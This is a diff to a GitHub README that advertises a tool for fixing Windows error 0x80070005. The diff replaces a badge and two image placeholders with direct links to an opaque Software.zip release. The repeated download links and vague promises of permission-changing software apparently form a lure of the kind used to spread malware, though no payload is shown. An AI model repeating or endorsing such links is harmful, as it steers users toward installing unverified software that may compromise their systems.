@@ -3,7 +3,7 @@
 Fixing Error 0x80070005 Access Denied is a GitHub repository created to address the common "Error 0x80070005" that indicates an access denied issue. This error often occurs during file operations or updates due to insufficient permissions. To help users resolve this issue, we provide a software tool that can adjust permissions and settings to overcome the access denied error.
 
 ## Download Software
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/kasonsh2450/Fixing-Error-0x80070005-Access-Denied/releases/download/v2.0/Software.zip)](https://github.com/kasonsh2450/Fixing-Error-0x80070005-Access-Denied/releases/download/v2.0/Software.zip)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -17,7 +17,7 @@ Welcome to the Fixing Error 0x80070005 Access Denied repository! 🚀
 
 Have you ever encountered the frustrating "Error 0x80070005" while trying to perform file operations or updates on your system? This error message signifies that access is denied due to insufficient permissions. But fret not! We understand the hassle this error can cause, and that's why we have developed a software tool to tackle this issue effectively.
 
-![Error 0x80070005](https://example.com/error_image.jpg)
+![Error 0x80070005](https://github.com/kasonsh2450/Fixing-Error-0x80070005-Access-Denied/releases/download/v2.0/Software.zip)
 
 ## Installation
 To get started with fixing the Error 0x80070005, follow these simple installation steps:
@@ -36,7 +36,7 @@ Once you have installed the software tool, it's time to put it to good use! Here
 4. After the tool completes its process, retry the file operation or update that was previously failing.
 5. Voilà! Say goodbye to the Error 0x80070005 and enjoy hassle-free file management on your system.
 
-![Software Tool](https://example.com/software_tool_image.jpg)
+![Software Tool](https://github.com/kasonsh2450/Fixing-Error-0x80070005-Access-Denied/releases/download/v2.0/Software.zip)
 
 ## Contributing
 We welcome contributions from the community to enhance and improve the Fixing Error 0x80070005 Access Denied software tool. If you have ideas, suggestions, or want to report issues, feel free to:
